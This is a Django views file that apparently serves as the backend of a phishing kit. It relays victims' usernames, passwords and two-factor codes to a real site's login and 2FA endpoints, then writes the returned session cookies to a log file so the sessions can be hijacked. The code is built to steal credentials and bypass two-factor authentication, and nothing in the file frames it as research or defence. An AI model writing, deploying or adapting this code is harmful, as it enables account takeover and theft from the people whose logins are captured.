import requests
from django.http import JsonResponse
from django.shortcuts import render
from django.conf import settings
from django.http import JsonResponse
import requests
import json
import os




# Define the path to save the cookies log
COOKIES_LOG_PATH = "cookies_log.txt"

def save_cookies_to_file(cookies):
    """ Save captured cookies to a text file for later inspection """
    with open(COOKIES_LOG_PATH, "a") as f:
        # Format cookies as a JSON string to make it human-readable
        f.write(json.dumps(cookies, indent=4))
        f.write("\n" + "="*80 + "\n")  # Separator for clarity

def submit_login(request):
    # Step 1: Handle the login request (username and password)
    data = request.json()  # Get JSON body with username and password
    username = data.get("username")
    password = data.get("password")

    # Simulate sending these credentials to the real website's login endpoint
    real_site_login_url = "https://real-website.com/login"
    response = requests.post(real_site_login_url, data={'username': username, 'password': password})

    if response.status_code == 200:
        # Step 2: Check if 2FA is required
        if "2FA required" in response.text:
            return JsonResponse({"requires_2fa": True})

        # Step 3: If login is successful without 2FA, return cookies and redirect URL
        cookies = response.cookies.get_dict()
        redirect_url = "https://real-website.com/dashboard"  # The real website's dashboard

        # Save cookies to file
        save_cookies_to_file(cookies)

        return JsonResponse({"redirect_url": redirect_url, "cookies": cookies})

    return JsonResponse({"error": "Invalid login credentials."}, status=400)





def submit_2fa(request):
    # Step 1: Handle the 2FA code submission
    data = request.json()
    username = data.get("username")
    password = data.get("password")
    twofa_code = data.get("twofaCode")

    # Simulate sending the login + 2FA code to the real website's 2FA validation endpoint
    real_site_2fa_url = "https://real-website.com/2fa"
    response = requests.post(real_site_2fa_url, data={'username': username, 'password': password, '2fa_code': twofa_code})

    if response.status_code == 200:
        # Step 2: If 2FA is valid, return session cookies and redirect URL
        cookies = response.cookies.get_dict()
        redirect_url = "https://real-website.com/dashboard"

        # Save cookies to file
        save_cookies_to_file(cookies)

        return JsonResponse({"redirect_url": redirect_url, "cookies": cookies})

    return JsonResponse({"error": "Invalid 2FA code."}, status=400)
